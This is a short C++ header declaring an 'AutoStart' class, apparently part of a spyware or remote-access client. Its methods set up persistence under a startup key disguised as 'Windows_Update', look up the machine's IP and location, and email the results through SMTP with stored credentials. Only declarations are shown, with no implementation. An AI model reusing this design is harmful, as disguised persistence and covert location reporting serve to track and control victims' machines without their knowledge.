#pragma once
#ifdef _WIN32
#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#endif
#include <vector>
#include <locale>
#include <sstream>
#include <iostream>
#include <fstream>
#include "Client.h"
#include <string>
#include <ctime>
#include <winsock2.h>

#define DEFAULT_KEYNAME L"Windows_Update"

class Client;

class AutoStart
{
private:
	std::string IP;
	std::string smtp;
	std::string sender_mail;
	std::string sender_name;
	std::string password;

	std::string rcpt_name;
	std::string mail_rcpt;

public:
	std::string get_ip();
	bool persistence(const wchar_t* keyname);
	AutoStart(Client* client, const std::string smtp, std::string sender_mail, std::string sender_name, std::string password, std::string mail_rcpt, std::string rcpt_name);
	void geolocalize();

	bool send_mail();

};

